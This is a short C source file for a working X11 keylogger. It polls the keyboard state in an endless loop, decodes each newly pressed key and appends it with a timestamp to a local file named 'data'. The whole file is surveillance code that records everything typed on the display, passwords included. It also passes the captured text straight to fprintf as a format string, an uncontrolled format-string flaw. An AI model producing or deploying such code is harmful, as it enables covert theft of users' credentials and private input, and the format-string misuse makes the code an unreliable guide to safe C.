#include <stdio.h>
#include <X11/Xlib.h>
#include <time.h>
#include <string.h>

// write_to_file() opens a file and appends the keys passed to it to the file
void write_to_file(char *text) {

	time_t t;
	struct tm *timeinfo;
	char buffer[32];
	
	// return time since 1970 I guess?
	t = time(NULL);
	
	timeinfo = localtime(&t);

	FILE *file = fopen("data", "a+");

	// These two lines are for removing the newline character at the end
	strcpy(buffer, ctime(&t));
	buffer[strlen(buffer)-1] = '\0';

	fprintf(file, buffer);
	fprintf(file, " : ");
	fprintf(file, text);
	fprintf(file, "\n");

	fclose(file);

} 

int main(void) {

	char new_keys[32] = {0};
	char old_keys[32] = {0};

	int byte;
	int bit;
	int keyCode;
	int keySym;
	char *key;

	int bitCheck;

	// Open display. Default name is :0
	Display *display = XOpenDisplay(":0");

	if (display == NULL) {
		fprintf(stderr, "ERROR: Could not open display\n");
		return 1;
	}

	while (1) {
		
		// Get the current state of the keyboard(which keys are pressed and not pressed) and store it as a bit vector in new_keys
		XQueryKeymap(display, new_keys);

		// Check if the new_keys array is NOT identical to the old_keys array
		if (memcmp(new_keys, old_keys, 32) != NULL) {
			
			for (byte = 0; byte < 32; byte++) {
				
				// Start is "00000001"
				bitCheck = 1;

				for (bit = 0; bit < 8; bit++) {

					// If the individual bit is "on" in the new_keys and "off" in the old_keys, then we know it has been pressed
					if ( (new_keys[byte] & bitCheck) && !(old_keys[byte] & bitCheck) ) {
						
						// The keycode is the position that we found the bit that's "on"
						keyCode = byte * 8 + bit;
						
						// XKeycodeToKeysym() translates the keyCode to the ASCII equivalent	
						keySym = XKeycodeToKeysym(display, keyCode, 0);
						
						// XKeysymToString() translates the ASCII keySym to a string(like a, b, x, or whatever)
						key = XKeysymToString(keySym);

						// Write the key to the file by calling the function
						write_to_file(key);
						
					}
					bitCheck = bitCheck << 1;
				}
			}
		}
		// Basically old_keys = new_keys
		memcpy(old_keys, new_keys, 32);


	}

	XCloseDisplay(display);
}
